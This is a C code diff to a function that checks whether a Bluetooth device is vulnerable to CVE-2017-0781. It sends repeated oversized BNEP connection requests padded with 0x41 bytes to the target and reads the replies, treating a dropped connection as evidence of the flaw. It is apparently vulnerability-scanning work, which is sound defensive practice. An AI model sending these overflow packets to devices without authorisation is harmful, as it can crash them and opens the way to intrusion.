@@ -1,6 +1,7 @@
 #include <arpa/inet.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/time.h>
 #include <unistd.h>
 
 #include "bluetooth.h"
@@ -210,9 +211,10 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
     struct sockaddr_l2 addr = { 0 };
     int sd, i;
     const uint8_t overflow_payload_val = 0x41;
-    char *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN);
+    char buf[BNEP_BUFFER_LEN] = { 0 }, *packet = (char *) malloc(sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN);
     struct bnep_setup_conn_req *conn_req;
-    
+    struct timeval tv;
+
     // Return a negative integer indicating failure to create socket
     if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
         return CVE_CHECK_ERR;
@@ -229,11 +231,26 @@ int is_vulnerable_to_cve_2017_0781(bdaddr_t *target)
     // Copy overflow payload
     memset(&(conn_req->service), overflow_payload_val, BNEP_OVERFLOW_PAYLOAD_LEN);
 
+    // Set a timeout for BNEP reads
+    tv.tv_sec = BNEP_OVERFLOW_TIMEOUT;
+    tv.tv_usec = 0;
+    setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
+
     if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
         return CVE_CHECK_ERR;
+    // Send one overflow packet and verify that the other device doesn't shut down the connection
+    if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN) < 0)
+        return 0;
+    if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+        return 0;
     for (int i = 0; i < BNEP_OVERFLOW_LOOP_LIMIT; i++)
+    {
         if (write(sd, packet, sizeof(struct bnep_setup_conn_req) + BNEP_OVERFLOW_PAYLOAD_LEN) < 0)
-            return CVE_CHECK_ERR;
+            return 1;
+        if (read(sd, buf, BNEP_BUFFER_LEN) < 0)
+            return 1;
+    }
+
     close(sd);
     return 0;
 }
